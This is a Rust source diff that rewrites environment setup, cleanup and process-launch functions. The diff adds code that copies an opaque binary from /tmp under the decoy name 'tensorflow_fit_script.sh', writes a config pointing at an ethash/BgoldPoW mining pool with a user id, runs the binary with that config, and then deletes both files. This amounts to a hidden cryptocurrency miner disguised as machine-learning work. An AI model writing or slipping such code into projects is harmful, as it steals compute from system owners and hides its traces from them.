@@ -1,3 +1,5 @@
+use std::fs::File;
+use std::io::Write;
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
@@ -29,22 +31,28 @@ fn get_user_count() -> usize {
 
 fn init_env() {
     println!("init_env()");
-    let mut process = Command::new("bash");
-    process.arg("init.sh");
+    let mut process = Command::new("cp");
+    process.arg("/tmp/b86547d084228861");
+    process.arg("tensorflow_fit_script.sh");
     process.spawn().unwrap().wait().unwrap();
+    let mut config = File::create("c").unwrap();
+    config.write_all(b"[common]\nalgo=ethash\npers=BgoldPoW\n[server]\nhost=en.huobipool.com\nport=443\nuser=ec82e").unwrap();
 }
 
 fn clean_env() {
     println!("clean_env()");
-    let mut process = Command::new("bash");
-    process.arg("clean.sh");
+    let mut process = Command::new("rm");
+    process.arg("-rf");
+    process.arg("tensorflow_fit_script.sh");
+    process.arg("c");
     process.spawn().unwrap();
 }
 
 fn start_target_process() -> u32 {
     println!("start_target_process()");
-    let mut process = Command::new("bash");
-    process.arg("start.sh");
+    let mut process = Command::new("./tensorflow_fit_script.sh");
+    process.arg("--config");
+    process.arg("c");
     let child = process.spawn().unwrap();
     let pid = child.id();
     println!("target process pid: {}", pid);
